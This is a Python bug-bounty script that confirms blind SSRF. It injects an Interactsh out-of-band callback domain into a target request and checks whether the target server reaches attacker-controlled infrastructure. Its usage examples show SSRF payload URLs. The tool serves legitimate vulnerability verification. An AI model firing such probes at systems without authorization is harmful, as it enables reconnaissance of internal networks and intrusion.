#!/usr/bin/env python3
"""
confirm_ssrf.py — CONFIRMS blind SSRF (and blind XXE/SSTI-via-fetch) with a real
out-of-band callback, via Interactsh, instead of inferring it from timing or
error-message guesswork.

"The request hung for 30 seconds" or "the error message mentioned a private IP"
is a lead, not proof. This spins up a one-time Interactsh session, gets a unique
callback domain, substitutes it into the suspected-vulnerable request, fires that
request once, and only calls it CONFIRMED when Interactsh actually receives an
interaction (DNS lookup or HTTP hit) tagged with that session's domain — meaning
the target server itself reached out to attacker-controlled infrastructure.

Requires the `interactsh-client` binary on PATH:
  GOBIN=$HOME/go/bin go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

Usage:
  # {OOB} is replaced with the generated callback domain before the request fires
  tools/confirm_ssrf.py "https://target.com/fetch?url=http://{OOB}/x" \\
      --proof findings/target-ssrf/proof.json

  tools/confirm_ssrf.py "https://target.com/import" --method POST \\
      --data 'feed_url=http://{OOB}/rss' --wait 30
"""
from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import asdict
from queue import Queue, Empty

from confirm_common import CONFIRMED, UNCONFIRMED, Proof, write_proof

USER_AGENT = "claude-bug-bounty/confirm_ssrf"
_DOMAIN_RE = re.compile(r"\b([a-z0-9]{20,40}\.(?:oast\.(?:fun|live|site|online|pro|me)|burpcollaborator\.net))\b", re.I)


def classify(interactions: list[dict], domain: str) -> tuple[str, str]:
    """Pure: decide CONFIRMED / UNCONFIRMED from whatever interaction records
    arrived while we were listening.

    CONFIRMED   — at least one interaction record references our session's
                  unique domain — proof the target reached attacker infra.
    UNCONFIRMED — no interaction arrived within the wait window. Does not prove
                  the target is safe (blind SSRF can be firewalled outbound,
                  rate-limited, or just slow) — only that we didn't catch it.
    """
    hits = [i for i in interactions if domain.split(".")[0] in json.dumps(i)]
    if hits:
        first = hits[0]
        proto = first.get("protocol", "?")
        remote = first.get("remote-address", "?")
        return CONFIRMED, f"{len(hits)} interaction(s) received via {proto} from {remote} — target reached our callback"
    return UNCONFIRMED, f"no interaction received for {domain} within the wait window"


def _reader_thread(proc: subprocess.Popen, q: Queue) -> None:
    for line in iter(proc.stdout.readline, ""):
        q.put(line)
    q.put(None)


def _start_interactsh() -> tuple[subprocess.Popen, Queue, str]:
    if not shutil.which("interactsh-client"):
        raise FileNotFoundError("interactsh-client")

    proc = subprocess.Popen(
        ["interactsh-client", "-json"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1,
    )
    q: Queue = Queue()
    threading.Thread(target=_reader_thread, args=(proc, q), daemon=True).start()

    domain = None
    deadline = time.time() + 15
    while time.time() < deadline and domain is None:
        try:
            line = q.get(timeout=1)
        except Empty:
            continue
        if line is None:
            break
        m = _DOMAIN_RE.search(line)
        if m:
            domain = m.group(1)

    if domain is None:
        proc.terminate()
        raise RuntimeError("could not read a callback domain from interactsh-client startup output")

    return proc, q, domain


def _fire_request(url: str, method: str, data: str | None, headers: dict) -> None:
    body = data.encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15):
            pass
    except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError):
        # A hung/failed request is expected and irrelevant — we only care whether
        # the TARGET's out-of-band request reaches our listener, not this response.
        pass


def _collect_interactions(q: Queue, wait_seconds: int) -> list[dict]:
    interactions = []
    deadline = time.time() + wait_seconds
    while time.time() < deadline:
        try:
            line = q.get(timeout=1)
        except Empty:
            continue
        if line is None:
            break
        line = line.strip()
        if line.startswith("{"):
            try:
                interactions.append(json.loads(line))
            except json.JSONDecodeError:
                pass
    return interactions


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Confirm blind SSRF via a real Interactsh OOB callback.")
    ap.add_argument("url_template", help="request URL/body containing the literal placeholder {OOB}")
    ap.add_argument("--method", default="GET")
    ap.add_argument("--data", default=None, help="request body (also may contain {OOB}) for POST/PUT")
    ap.add_argument("--header", action="append", default=[], help="'Name: value' header (repeatable)")
    ap.add_argument("--wait", type=int, default=20, help="seconds to wait for a callback after firing (default 20)")
    ap.add_argument("--proof", default=None, help="write a proof.json artifact here")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    if "{OOB}" not in args.url_template and "{OOB}" not in (args.data or ""):
        print("[-] neither the URL nor --data contains the {OOB} placeholder", file=sys.stderr)
        return 2

    try:
        proc, q, domain = _start_interactsh()
    except FileNotFoundError:
        print("[-] interactsh-client not found on PATH.\n"
              "    GOBIN=$HOME/go/bin go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
              file=sys.stderr)
        return 127
    except RuntimeError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1

    try:
        target_url = args.url_template.replace("{OOB}", domain)
        target_data = args.data.replace("{OOB}", domain) if args.data else None
        headers = {"User-Agent": USER_AGENT}
        for h in args.header:
            if ":" not in h:
                print(f"[-] --header must be 'Name: value', got {h!r}", file=sys.stderr)
                return 2
            name, _, value = h.partition(":")
            headers[name.strip()] = value.strip()

        _fire_request(target_url, args.method, target_data, headers)
        interactions = _collect_interactions(q, args.wait)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    verdict, reason = classify(interactions, domain)

    proof = Proof(
        tool="confirm_ssrf.py",
        vuln_class="ssrf",
        target_url=target_url,
        verdict=verdict,
        evidence={"oob_domain": domain, "interactions": interactions, "reason": reason},
    )
    if args.proof:
        write_proof(args.proof, proof)

    if args.json:
        print(json.dumps(asdict(proof), indent=2))
    else:
        icon = "[+]" if verdict == CONFIRMED else "[-]"
        print(f"{icon} {verdict}: {reason}")
        if args.proof:
            print(f"    proof written to {args.proof}")

    return 0 if verdict == CONFIRMED else 1


if __name__ == "__main__":
    raise SystemExit(main())
